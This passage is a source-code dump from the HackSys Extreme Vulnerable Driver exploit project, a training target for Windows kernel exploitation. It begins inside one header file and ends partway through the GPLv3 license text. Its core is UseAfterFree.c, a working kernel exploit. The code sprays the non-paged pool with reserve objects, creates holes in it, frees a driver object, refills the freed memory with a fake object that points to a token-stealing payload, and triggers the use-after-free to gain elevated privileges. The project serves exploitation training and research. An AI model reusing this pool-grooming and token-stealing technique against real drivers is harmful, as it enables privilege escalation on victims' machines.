THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedStackVariable.h

Abstract:
    This module implements the data structures used by the
    exploit for Uninitialized Stack Variable Vulnerability
    implemented in HackSys Extreme Vulnerable Driver.

--*/

#ifndef __UNINITIALIZED_STACK_VARIABLE_H__
    #define __UNINITIALIZED_STACK_VARIABLE_H__

    #pragma once

    #include "Common.h"

    DWORD WINAPI    UninitializedStackVariableThread(LPVOID Parameter);

#endif  //__UNINITIALIZED_STACK_VARIABLE_H__

```

`Exploit/UseAfterFree.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UseAfterFree.c

Abstract:
    This module implements the exploit for Use After Free
    Vulnerability implemented in HackSys Extreme Vulnerable
    Driver.

--*/

#include "UseAfterFree.h"

VOID SprayNonPagedPoolWithReserveObjects() {
    UINT32 i = 0;
    HMODULE hModule = NULL;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    hModule = LoadLibraryA("ntdll.dll");

    if (!hModule) {
        DEBUG_ERROR("\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(hModule, "NtAllocateReserveObject");

    if (!NtAllocateReserveObject) {
        DEBUG_ERROR("\t\t[-] Failed Resolving NtAllocateReserveObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    for (i = 0; i < 10000; i++) {
        NtStatus = NtAllocateReserveObject(&ReserveObjectArrayA[i], 0, IO_COMPLETION_OBJECT);

        if (NtStatus != STATUS_SUCCESS) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Reserve Objects: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

    for (i = 0; i < 5000; i++) {
        NtStatus = NtAllocateReserveObject(&ReserveObjectArrayB[i], 0, IO_COMPLETION_OBJECT);

        if (NtStatus != STATUS_SUCCESS) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Reserve Objects: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

VOID CreateHolesInNonPagedPoolByClosingReserveObjects() {
    UINT32 i = 0;

    for (i = 0; i < 5000; i += 2) {
        if (!CloseHandle(ReserveObjectArrayB[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

VOID FreeReserveObjects() {
    UINT32 i = 0;

    for (i = 0; i < 10000; i++) {
        if (!CloseHandle(ReserveObjectArrayA[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

    for (i = 1; i < 5000; i +=2) {
        if (!CloseHandle(ReserveObjectArrayB[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

DWORD WINAPI UseAfterFreeThread(LPVOID Parameter) {
    UINT32 i = 0;
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    PFAKE_OBJECT FakeObject = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &TokenStealingPayloadWin7Generic;

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        // Allocate the Heap chunk
        FakeObject = (PFAKE_OBJECT)HeapAlloc(GetProcessHeap(),
                                             HEAP_ZERO_MEMORY,
                                             sizeof(FAKE_OBJECT));

        if (!FakeObject) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", FakeObject);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", sizeof(FAKE_OBJECT));
        }

        DEBUG_INFO("\t\t[+] Preparing FAKE_OBJECT structure\n");

        RtlFillMemory((PVOID)FakeObject, sizeof(FAKE_OBJECT), 0x41);

        FakeObject->buffer[sizeof(FakeObject->buffer) - 1] = '\0';
        *(PULONG)FakeObject = (ULONG)EopPayload;

        DEBUG_INFO("\t\t\t[+] FakeObject Value: 0x%p\n", *(PULONG)FakeObject);
        DEBUG_INFO("\t\t\t[+] FakeObject Address: 0x%p\n", FakeObject);
        DEBUG_INFO("\t\t\t[+] FAKE_OBJECT Size: 0x%X\n", sizeof(FAKE_OBJECT));

        DEBUG_INFO("\t\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_INFO("\t\t[+] Preparing NonPaged Kernel Pool Layout\n");

        DEBUG_INFO("\t\t\t[+] Spraying With Reserve Objects\n");

        SprayNonPagedPoolWithReserveObjects();

        DEBUG_INFO("\t\t\t[+] Creating Holes\n");

        CreateHolesInNonPagedPoolByClosingReserveObjects();

        DEBUG_INFO("\t\t[+] Working With Vulnerable UaF Object In NonPaged Pool\n");
        DEBUG_INFO("\t\t\t[+] Allocating UaF Object\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,
                        NULL,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        DEBUG_INFO("\t\t\t[+] Freeing UaF Object\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
                        NULL,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        // Allocate the FAKE_OBJECT multiple times to take up the freed memory chunk
        DEBUG_INFO("\t\t\t[+] Filling Freed Chunks\n");

        OutputDebugString("****************Kernel Mode****************\n");

        for (i = 0; i < 0x1000; i++) {
            DeviceIoControl(hFile,
                            HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT,
                            (LPVOID)FakeObject,
                            0,
                            NULL,
                            0,
                            &BytesReturned,
                            NULL);
        }

        OutputDebugString("****************Kernel Mode****************\n");

        DEBUG_INFO("\t\t\t[+] Freeing Reserve Objects\n");

        FreeReserveObjects();

        DEBUG_MESSAGE("\t[+] Triggering Kernel Use After Free\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
                        NULL,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)FakeObject);

        FakeObject = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/UseAfterFree.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UseAfterFree.h

Abstract:
    This module implements the data structures used by the
    exploit for Use After Free Vulnerability implemented in
    HackSys Extreme Vulnerable Driver.

--*/

#ifndef __USE_AFTER_FREE_H__
    #define __USE_AFTER_FREE_H__

    #pragma once

    #include "Common.h"

    #define IO_COMPLETION_OBJECT 1

    typedef struct _FAKE_OBJECT {
        CHAR buffer[0x58];
    } FAKE_OBJECT, *PFAKE_OBJECT;

    HANDLE    ReserveObjectArrayA[10000];
    HANDLE    ReserveObjectArrayB[5000];

    VOID            FreeReserveObjects();
    VOID            SprayNonPagedPoolWithReserveObjects();
    DWORD WINAPI    UseAfterFreeThread(LPVOID Parameter);
    VOID            CreateHolesInNonPagedPoolByClosingReserveObjects();

#endif //__USE_AFTER_FREE_H__

```

`Exploit/arg.h`:

```h
#ifndef __ARG_H__
    #define __ARG_H__

    extern char *argv0;

    #define USED(x)     ((void)(x))

    #define ARGBEGIN    for (argv0 = *argv, argv++, argc--;\
                                     argv[0] && argv[0][1]\
                                     && argv[0][0] == '-';\
                                     argc--, argv++) {\
                                 char _argc;\
                                 char **_argv;\
                                 int brk;\
                                 if (argv[0][1] == '-' && argv[0][2] == '\0') {\
                                        argv++;\
                                        argc--;\
                                        break;\
                                 }\
                                 for (brk = 0, argv[0]++, _argv = argv;\
                                               argv[0][0] && !brk;\
                                               argv[0]++) {\
                                          if (_argv != argv)\
                                                break;\
                                          _argc = argv[0][0];\
                                          switch (_argc)

    #define ARGEND               }\
                                 USED(_argc);\
                        }\
                        USED(argv);\
                        USED(argc);

    #define ARGC()      _argc

    #define EARGF(x)    ((argv[0][1] == '\0' && argv[1] == NULL)?\
                                 ((x), abort(), (char *)0) :\
                                 (brk = 1, (argv[0][1] != '\0')?\
                                         (&argv[0][1]) :\
                                         (argc--, argv++, argv[0])))

    #define ARGF()      ((argv[0][1] == '\0' && argv[1] == NULL)?\
                                (char *)0 :\
                                (brk = 1, (argv[0][1] != '\0')?\
                                        (&argv[0][1]) :\
                                        (argc--, argv++, argv[0])))

#endif //__ARG_H__

```

`LICENSE`:

```
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
